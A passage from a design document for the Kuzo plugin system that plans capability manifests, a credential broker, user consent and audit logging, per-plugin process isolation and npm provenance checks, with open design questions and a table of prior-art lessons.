# Trust all (dev only, logged as warning)
KUZO_TRUST_ALL=true node dist/core/server.js

# Strict mode — refuse to load plugins without stored consent
KUZO_STRICT=true node dist/core/server.js
```

If consent is missing and no trust override is set, the plugin is skipped with a log message: `Plugin "weather" skipped — no consent. Run: kuzo consent`

### Revocation

```bash
kuzo revoke github                           # Revoke all for a plugin
kuzo revoke github --capability "network:*"  # Revoke specific capability
kuzo permissions                             # List all grants
kuzo audit --since 7d                        # Audit log of capability usage
```

---

## 10. Implementation Plan

### Phase 2.5a — Manifest + Hardening (no new dependencies)

**Scope:** TypeScript interface changes, scoped callTool, intrinsic freezing. Zero runtime behavior change for existing plugins — purely additive.

| Task | Files | LOC |
|------|-------|-----|
| Add capability types + `KuzoPluginV2` to `types.ts` | `src/plugins/types.ts` | ~80 |
| Add `dependencies` extraction + scoped `callTool` builder to loader | `src/core/loader.ts` | ~30 |
| Intrinsic freezing + `process.exit` guard in server startup | `src/core/server.ts` | ~20 |
| Shutdown timeout in registry | `src/core/registry.ts` | ~10 |
| Migrate 3 plugins to v2 manifest (add `capabilities` arrays) | 3 plugin `index.ts` files | ~60 |
| Collision error message: stop leaking plugin names | `src/core/registry.ts` | ~5 |

**Acceptance:** `npm run typecheck && npm run lint && npm run build` passes. Server boots with all 3 plugins. Scoped `callTool` verified: github can call git-context, jira cannot.

### Phase 2.5b — Credential Broker

**Scope:** `CredentialBroker` interface + implementation, client factories for GitHub/Jira, migrate plugins off raw `config.get()`.

| Task | Files | LOC |
|------|-------|-----|
| `CredentialBroker` interface + `DefaultCredentialBroker` impl | `src/core/credentials.ts` (new) | ~150 |
| Client factory for GitHub (creates Octokit from token) | `src/core/credentials.ts` | ~20 |
| Client factory for Jira (creates JiraClient from host/email/token) | `src/core/credentials.ts` | ~25 |
| Inject broker into `PluginContext` in loader | `src/core/loader.ts` | ~15 |
| Migrate `github/index.ts` to use `context.credentials.getClient()` | `src/plugins/github/index.ts` | ~10 |
| Migrate `jira/index.ts` to use `context.credentials.getClient()` | `src/plugins/jira/index.ts` | ~10 |
| Audit logging on `getRawCredential()` calls | `src/core/credentials.ts` | ~15 |
| Deprecation warnings on `context.config` usage | `src/core/loader.ts` | ~10 |

**Acceptance:** Plugins load and function identically. GitHub plugin creates Octokit via broker, not raw token. `context.config` still works but logs deprecation.

### Phase 2.5c — Consent Flow + Audit ✅ COMPLETE

**Scope:** `kuzo consent` CLI command, consent storage, audit log, trust overrides. Also: `context.config` removal, `requiredConfig`/`optionalConfig` removal, V1 legacy gate.

| Task | Files | LOC |
|------|-------|-----|
| Consent storage read/write (`~/.kuzo/consent.json`) | `src/core/consent.ts` (new) | ~140 |
| `kuzo consent` CLI command with interactive UI | `src/cli/commands/consent.ts` (new) | ~200 |
| `kuzo permissions` / `kuzo revoke` / `kuzo audit` commands | `src/cli/commands/consent.ts` | (above) |
| Loader integration: check consent before plugin load | `src/core/loader.ts` | ~50 |
| Trust override env vars (`KUZO_TRUST_PLUGINS`, etc.) | `src/core/loader.ts` | (above) |
| Structured audit log (capability usage events) | `src/core/audit.ts` (new) | ~110 |
| Wire audit into credential broker | `src/core/credentials.ts` | ~20 |
| Remove `context.config` + V1 config fields | `src/plugins/types.ts`, `src/core/loader.ts` | ~-60 |
| V1 legacy gate (`KUZO_TRUST_LEGACY`) | `src/core/loader.ts` | (above) |

**Acceptance:** ✅ Fresh install skips all plugins with "run: kuzo consent". ✅ `KUZO_TRUST_ALL=true` loads all. ✅ `KUZO_TRUST_PLUGINS=x,y` loads selectively. ✅ Audit log captures credential access events to `~/.kuzo/audit.log` + stderr.

### Phase 2.5d — Process Isolation

**Scope:** Child process per plugin, IPC bridge, Node Permission Model flags.

| Task | Files | LOC |
|------|-------|-----|
| `plugin-host.ts` — generic child process that loads a plugin | `src/core/plugin-host.ts` (new) | ~150 |
| IPC protocol (JSON-RPC over child process IPC channel) | `src/core/ipc.ts` (new) | ~200 |
| `PluginProxy` — implements `ToolDefinition`/`ResourceDefinition` over IPC | `src/core/plugin-proxy.ts` (new) | ~150 |
| Loader spawns child processes instead of in-process import | `src/core/loader.ts` | ~80 |
| Permission Model flags per child (`--permission --allow-fs-read=...`) | `src/core/loader.ts` | ~30 |
| Crash recovery (restart crashed plugin processes) | `src/core/loader.ts` | ~50 |

**Acceptance:** Each plugin runs in its own process. Plugin crash doesn't kill the server. `GITHUB_TOKEN` is not in the jira plugin's `process.env`.

### Phase 2.5e — Supply Chain

**Scope:** npm provenance verification, plugin install/update CLI, rollback.

| Task | Files | LOC |
|------|-------|-----|
| `kuzo plugins install <name>` with provenance verification | `src/cli/commands/plugins.ts` (new) | ~200 |
| `kuzo plugins update` / `kuzo plugins rollback` | `src/cli/commands/plugins.ts` | ~150 |
| Provenance verification using `@sigstore/verify` | `src/core/provenance.ts` (new) | ~100 |
| Plugin registry in `kuzo.config.ts` (installed third-party plugins) | `src/core/config.ts` | ~50 |

---

## 11. Open Questions

Decisions needed before or during implementation:

### 1. Tool Name Prefixing

**Options:**
- (a) Keep flat names (`create_pull_request`) — current behavior, no breaking change
- (b) Prefix with plugin name (`github.create_pull_request`) — namespace isolation, breaking change for MCP clients

**Recommendation:** (b), but only at the OSS release boundary. All internal usage updates in one pass. MCP clients (Claude) see the new names from day one of the public release.

**Impact:** Every MCP client config that references tool names needs updating. Do it once, before anyone else depends on the names.

### 2. Credential Storage v1

**Options:**
- (a) Env vars only (simplest — the value is the API contract, not the storage) *(recommended)*
- (b) `@napi-rs/keyring` from day one (better security posture, more work)

The broker interface is the same either way — storage backend is an implementation detail.

### 3. SES/Endo for Intrinsic Hardening

**Options:**
- (a) Manual `Object.freeze()` on critical prototypes (simple, covers 90% case) *(recommended for 2.5a)*
- (b) SES `lockdown()` (comprehensive, freezes ALL intrinsics, used by MetaMask/Agoric)

SES is battle-tested but adds a dependency and has DX implications (frozen `Error.stack`, frozen `Date.now()`). Worth evaluating for 2.5d when process isolation makes most of it redundant anyway.

### 4. Audit Log Destination — RESOLVED (2.5c)

**Decision:** (c) Both — JSON lines to `~/.kuzo/audit.log` + real-time echo to stderr via `KuzoLogger`.

### 5. `requiredConfig` / `optionalConfig` Removal Timeline — RESOLVED (2.5c)

**Decision:** Removed in 2.5c. `context.config` stripped from `PluginContext`. `requiredConfig`/`optionalConfig` stripped from `KuzoPluginV1`. V1 plugins blocked by default, `KUZO_TRUST_LEGACY=true` to allow.

### 6. Permission Escalation on Plugin Update — RESOLVED (2.5c)

**Decision:** (a) Refuse to load until user re-consents. `ConsentStore.isConsentStale()` detects version or capability changes and marks consent stale. Loader skips with "consent is stale — run: kuzo consent".

---

## References

### Prior Art Studied

| System | Key Insight for Kuzo |
|--------|---------------------|
| Deno permissions | Declarative + per-resource granularity is the sweet spot. Runtime prompts are annoying for servers. |
| Chrome Manifest V3 | Required/optional split is worth adopting. 86% of extensions over-request — system should incentivize minimal requests. |
| Android/iOS permissions | Contextual prompting (at use time) beats install-time walls. Auto-revocation for unused grants. |
| VS Code Extension Host | Process isolation for crash safety. But no security sandbox — relies on marketplace trust. 26.5% of extensions found high-risk (2025 study). |
| Object-capability model | Authority = unforgeable reference. If you don't have the reference, you can't do the thing. `PluginContext` is already half this model. |
| Windows 11 MCP security | Microsoft validated our exact approach: declarative capabilities, consent before execution, immutable tool definitions, proxy-mediated enforcement. |
| Kubernetes service accounts | Short-lived, scoped tokens auto-injected. Pods never manage credentials. Closest analog to our `getClient()` pattern. |
| ShadyPanda campaign (Dec 2025) | Silent auto-update + 4.3M users compromised. Never auto-update plugins. |
| npm provenance (Sigstore) | Free supply chain verification. Only ~7% adoption, but we can set a higher bar for our ecosystem. |
| vm2 CVE history | 7 sandbox escapes since 2022, including CVSS 9.8 in 2026. JS-level sandboxing is an endless cat-and-mouse game. |
| `@napi-rs/keyring` | Keytar replacement. Rust binding, no libsecret dependency, 77k weekly downloads. |

### Packages to Evaluate

| Package | Purpose | Status |
|---------|---------|--------|
| `@napi-rs/keyring` | OS keychain access (Phase 2.5d+) | Active, v1.2.0 |
| `@sigstore/verify` | npm provenance verification (Phase 2.5e) | Active, v3.1.0 |
| `ses` (Endo) | Comprehensive intrinsic hardening (evaluate for 2.5d) | Active, used by MetaMask |
